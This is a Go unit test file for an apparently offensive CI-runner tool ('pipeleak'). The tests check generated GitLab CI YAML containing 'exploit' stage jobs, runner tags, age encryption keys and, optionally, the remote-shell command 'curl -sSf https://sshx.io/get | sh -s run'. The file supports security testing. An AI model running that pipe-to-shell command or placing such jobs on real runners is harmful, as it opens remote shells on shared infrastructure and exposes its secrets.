package runners

import (
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestGenerateCIYml(t *testing.T) {
	tests := []struct {
		name                   string
		runnerTags             []string
		shell                  bool
		ageEncryptionPublicKey string
		expectedContains       []string
		expectedNotContains    []string
	}{
		{
			name:                   "generates basic exploit job with no tags",
			runnerTags:             []string{},
			shell:                  false,
			ageEncryptionPublicKey: "",
			expectedContains: []string{
				"pipeleak-job:",
				"stage: exploit",
				"stages:",
				"- exploit",
			},
			expectedNotContains: []string{
				"tags:",
				"sshx.io",
				"FiloSottile/age",
			},
		},
		{
			name:                   "generates job with single runner tag",
			runnerTags:             []string{"docker"},
			shell:                  false,
			ageEncryptionPublicKey: "",
			expectedContains: []string{
				"pipeleak-job-docker:",
				"tags:",
				"- docker",
			},
			expectedNotContains: []string{
				"sshx.io",
				"FiloSottile/age",
			},
		},
		{
			name:                   "generates job with multiple runner tags",
			runnerTags:             []string{"docker", "kubernetes", "linux"},
			shell:                  false,
			ageEncryptionPublicKey: "",
			expectedContains: []string{
				"pipeleak-job-docker:",
				"pipeleak-job-kubernetes:",
				"pipeleak-job-linux:",
				"- docker",
				"- kubernetes",
				"- linux",
			},
			expectedNotContains: []string{
				"sshx.io",
				"FiloSottile/age",
			},
		},
		{
			name:                   "includes shell command when shell is true",
			runnerTags:             []string{},
			shell:                  true,
			ageEncryptionPublicKey: "",
			expectedContains: []string{
				"pipeleak-job:",
				"sshx.io",
				"curl -sSf https://sshx.io/get | sh -s run",
			},
			expectedNotContains: []string{
				"FiloSottile/age",
			},
		},
		{
			name:                   "includes age encryption when public key provided",
			runnerTags:             []string{},
			shell:                  false,
			ageEncryptionPublicKey: "age1abc123xyz456",
			expectedContains: []string{
				"pipeleak-job:",
				"age",
				"FiloSottile/age",
				"age1abc123xyz456",
			},
			expectedNotContains: []string{
				"sshx.io",
			},
		},
		{
			name:                   "includes both shell and age encryption",
			runnerTags:             []string{"docker"},
			shell:                  true,
			ageEncryptionPublicKey: "age1testkey",
			expectedContains: []string{
				"pipeleak-job-docker:",
				"sshx.io",
				"age",
				"age1testkey",
			},
			expectedNotContains: []string{},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := generateCIYml(tt.runnerTags, tt.shell, tt.ageEncryptionPublicKey)

			// Verify it's valid YAML-like content
			assert.NotEmpty(t, result)

			// Check expected content is present
			for _, expected := range tt.expectedContains {
				assert.Contains(t, result, expected, "YAML should contain: %s", expected)
			}

			// Check unexpected content is not present
			for _, notExpected := range tt.expectedNotContains {
				assert.NotContains(t, result, notExpected, "YAML should not contain: %s", notExpected)
			}

			// Verify stages section exists
			assert.Contains(t, result, "stages:")

			// Verify exploit stage is mentioned
			assert.Contains(t, result, "exploit")
		})
	}
}

func TestGenerateCIYml_YAMLStructure(t *testing.T) {
	t.Run("generates valid YAML structure", func(t *testing.T) {
		result := generateCIYml([]string{}, false, "")

		// Basic YAML validation - should have key-value pairs
		lines := strings.Split(result, "\n")
		require.Greater(t, len(lines), 5, "YAML should have multiple lines")

		// Should have at least one job defined
		hasJob := false
		for _, line := range lines {
			if strings.Contains(line, "pipeleak-job") {
				hasJob = true
				break
			}
		}
		assert.True(t, hasJob, "YAML should define at least one pipeleak job")
	})
}

func TestGenerateCIYml_EdgeCases(t *testing.T) {
	t.Run("handles nil runner tags", func(t *testing.T) {
		result := generateCIYml(nil, false, "")
		assert.NotEmpty(t, result)
		assert.Contains(t, result, "pipeleak-job:")
	})

	t.Run("handles empty string age key", func(t *testing.T) {
		result := generateCIYml([]string{}, false, "")
		assert.NotContains(t, result, "FiloSottile/age")
	})

	t.Run("handles special characters in tags", func(t *testing.T) {
		result := generateCIYml([]string{"docker-latest", "k8s_prod"}, false, "")
		assert.Contains(t, result, "docker-latest")
		assert.Contains(t, result, "k8s_prod")
	})
}
